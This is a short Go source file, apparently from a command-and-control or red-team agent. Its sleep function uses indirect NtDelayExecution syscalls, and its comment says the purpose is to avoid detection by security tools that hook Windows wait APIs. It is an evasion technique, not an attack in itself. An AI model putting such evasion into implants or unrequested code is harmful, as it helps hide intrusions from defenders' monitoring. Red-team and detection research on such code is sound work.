//go:build windows
// +build windows

package commands

import (
	"time"
)

// AgentSleep performs a sleep using the indirect NtDelayExecution syscall if available,
// otherwise falling back to standard time.Sleep. This reduces the visibility of the agent
// in the context of wait API hooking (e.g. Sleep/SleepEx).
func AgentSleep(d time.Duration) {
	if d <= 0 {
		return
	}

	if IndirectSyscallsAvailable() {
		// NtDelayExecution expects a pointer to a LARGE_INTEGER.
		// A negative value specifies relative time in 100-nanosecond intervals.
		interval := -int64(d / (100 * time.Nanosecond))
		status := IndirectNtDelayExecution(false, &interval)

		// If NtDelayExecution fails (e.g. syscall stub generation failed but
		// IndirectSyscallsAvailable was true), fallback to time.Sleep.
		if status == 0 { // STATUS_SUCCESS
			return
		}
	}

	time.Sleep(d)
}
